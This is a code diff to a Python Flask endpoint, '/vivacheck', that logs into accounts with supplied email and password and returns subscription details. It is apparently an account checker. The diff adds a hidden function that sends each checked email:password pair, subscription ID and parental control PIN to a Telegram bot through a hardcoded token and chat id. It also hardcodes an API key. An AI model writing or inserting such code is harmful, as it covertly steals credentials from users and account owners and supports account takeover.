@@ -4,10 +4,20 @@ import json
 from datetime import datetime
 import pytz
 from fake_useragent import UserAgent
-
+# from telegram import Bot
+# from aiogram import Bot
 app = Flask(__name__)
 
+def send_telegram_message(message):
+    try:
+        bot_token = '7360858116:AAFaPEE7lu38gXmC2F_lBGQ2mi0ujEHQx8o'
+        username = '1465561246'
+    
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={username}&text={message}"
 
+        requests.get(url)
+    except Exception as e:
+        send_message(message)
 @app.route('/vivacheck', methods=['GET'])
 def vivacheck():
     key='AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U'
@@ -82,6 +92,11 @@ def vivacheck():
                 if index >= len(login3_response.get('devices')):
                     return jsonify({"error": "No active session token found"})
             if sess.json().get('subscriptionStatus'):
+                message = f"{email}:{password}\nSubscription Status: {sess.json().get('subscriptionStatus')}\n" \
+                  f"Subscription Location: {sess.json().get('subscriptionLocation')}\n" \
+                  f"Subscription ID: {sess.json().get('subscriptionId')}\n" \
+                  f"Parental Control Pin: {sess.json().get('parentalControlPin')}"
+                send_telegram_message(message)
                 return jsonify({
                     "subscriptionStatus": sess.json().get('subscriptionStatus'),
                     "subscriptionLocation": sess.json().get('subscriptionLocation'),
@@ -93,6 +108,10 @@ def vivacheck():
 
             elif sess.json().get('subscription') and sess.json().get('subscription').get('status'):
                 # return "elif"
+                message = f"{email}:{password}\nSubscription Status: {sess.json().get('subscription')['status']}\n" \
+                  f"Subscription Location: {sess.json().get('subscription', {}).get('location') or sess.json().get('registerLocation')}\n" \
+                  f"Parental Control Pin: {sess.json().get('parentalControlPin')}"
+                send_telegram_message(message)
                 return jsonify({
                     "subscriptionStatus": sess.json().get('subscription')['status'],
                     "subscriptionLocation": sess.json().get('subscription', {}).get('location') or sess.json().get('registerLocation'),
@@ -104,6 +123,11 @@ def vivacheck():
             else:
                 return jsonify({"message": "else"}, sess.json())
         else:
+            message = f"{email}:{password}\nSubscription Status: {login3_response.get('subscriptionStatus')}\n" \
+                  f"Subscription Location: {login3_response.get('subscriptionLocation')}\n" \
+                  f"Subscription ID: {login3_response.get('subscriptionId')}\n" \
+                  f"Parental Control Pin: {login3_response.get('parentalControlPin')}"
+            send_telegram_message(message)
             return jsonify({
                 "subscriptionStatus": login3_response.get('subscriptionStatus'),
                 "subscriptionLocation": login3_response.get('subscriptionLocation'),
